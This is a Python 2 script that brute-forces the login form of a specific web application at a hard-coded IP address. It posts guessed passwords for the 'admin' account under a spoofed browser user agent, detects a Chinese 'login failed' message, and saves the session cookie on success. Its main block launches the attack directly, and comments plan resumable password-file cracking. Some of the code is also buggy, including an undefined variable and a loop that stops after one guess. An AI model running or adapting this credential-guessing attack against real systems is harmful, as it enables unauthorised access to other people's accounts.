#!/usr/bin/python
#coding=utf8
#filename:web_auth_cookie_fcxx.py
"""
需要增加1：从文本文件中读取密码，并用一个文件来保存当前读取到的位置，
下一次可以判断有无记录位置的文件，作为进度保存。
20130715-2050 http://218.89.119.149:9080/fcxx/index.do

"""
import urllib
import urllib2
import cookielib
import time

class Auth_Cookie():
    """
    how_to_use:
    >>> from python.web_auth_cookie_fcxx import Auth_Cookie
    >>> from python.web_auth_cookie_fcxx import *
    >>> url11 = "http://218.89.119.149:9080/fcxx/userLogin.do"
    >>> file11 = "/tmp/cookie11.txt"
    >>> agent11 = "Mozilla/4.0 (compatible; MSIE 5.5; Windows NT)"
    >>> pwd11 = ['aaa', 'bbb', 'ksksie','ssdssw','scbh001']
    >>> s11 = Auth_Cookie(agent11, file11, url11, 'admin')
    >>> method1:
    >>> s11resu = s11.crack(pwd11)
    >>> 
    >>> method2:
    >>> file1 = open('pwd.txt')
    >>> file1pwd = iter(file1.next())
    >>> while True:
    >>>    try:
    >>>        s11.crack2(file1pwd.next().strip())
    >>>    except StopIteration:
    >>>        break
    """

    def __init__(self, user_agent, cookie_file, url, username):
        """
        url ==> url to test
        cookie_file ==> file of save cookie
        user_agent ==> http client agent
        """
        client_headers = {'User-Agent':user_agent}
        self.cookiejar = cookielib.MozillaCookieJar(cookie_file)
        self.cookieproc = urllib2.HTTPCookieProcessor(self.cookiejar)
        self.opener = urllib2.build_opener(self.cookieproc)
        self.req = urllib2.Request(url, client_headers)
        self.user_crack = username

    def crack(self, pwd_list):
        """
        pwd_list ==> ['111', '222', .....]
        req = urllib2.Request(url=arg1, headers=client_headers, data=pwd_encode)
        """
        for key1 in pwd_list:
            pwd_encode = urllib.urlencode({
                    'userName': self.user_crack,
                    'password': key1,
                    })
            try:
                response = self.opener.open(self.req, pwd_encode)
            except urllib2.HTTPError, e:
                print "at opener.open, raise ERROR", e
                return
            response_resu = response.getcode()
            #for test
            #print time.ctime(), "===", response_resu
            #return response.read()
            """not ready, so test and test"""
            if response_resu == 200:
                response_html = response.read()
                #怎么样判断是通过验证，标志是***用户登陆失败***
                respon_uni = unicode(response_html, 'gb18030')
                case = respon_uni.encode('utf-8').find('用户登陆失败')
                if case != -1:
                    #print "false.....", key1
                    pass
                else:
                    print time.ctime(), " Find The Key: ", key1
                    self.cookiejar.save()
                    return "good luck"
            return "error"

    def crack2(self, pwd):
        """
        pwd_list ==> '111'
        req = urllib2.Request(url=arg1, headers=client_headers, data=pwd_encode)
        """
        pwd_encode = urllib.urlencode({
                'userName': self.user_crack,
                'password': pwd,
                })
        try:
            response = self.opener.open(self.req, pwd_encode)
        except urllib2.HTTPError, e:
            print "at opener.open, raise ERROR", e
            return
        response_resu = response.getcode()
        #for test
        #print time.ctime(), "===", response_resu
        #return response.read()
        """not ready, so test and test"""
        if response_resu == 200:
            response_html = response.read()
            #怎么样判断是通过验证，标志是***用户登陆失败***
            respon_uni = unicode(response_html, 'gb18030')
            case = respon_uni.encode('utf-8').find('用户登陆失败')
            if case != -1:
                #print "false.....", key1
                return
            else:
                print time.ctime(), " Find The Key: ", key1
                self.cookiejar.save()
                print "good luck"
                exit(0)

    def __iter__(self):
        return self

    def next(self, pwd_list):
        for tmp in pwd_list:
            resu = self.crack(tmp)
        return resu
    

    def test():
        global aaa1
        s11 = Auth_Cookie(agent11, file11, url11, 'scbh001')
        aaa1 = s11.crack(pwd11)

#ready to crack:
url11 = "http://218.89.119.149:9080/fcxx/userLogin.do"
file11 = "/tmp/cookie11.txt"
agent11 = "Mozilla/4.0 (compatible; MSIE 5.5; Windows NT)"
pwd11 = ['aaa', 'bbb', 'ksksie','ssdssw','scbh001']
aaa1 = ""

if __name__ == "__main__":
    s11 = Auth_Cookie(agent11, file11, url11, 'admin')
    s11.crack(pwd11)


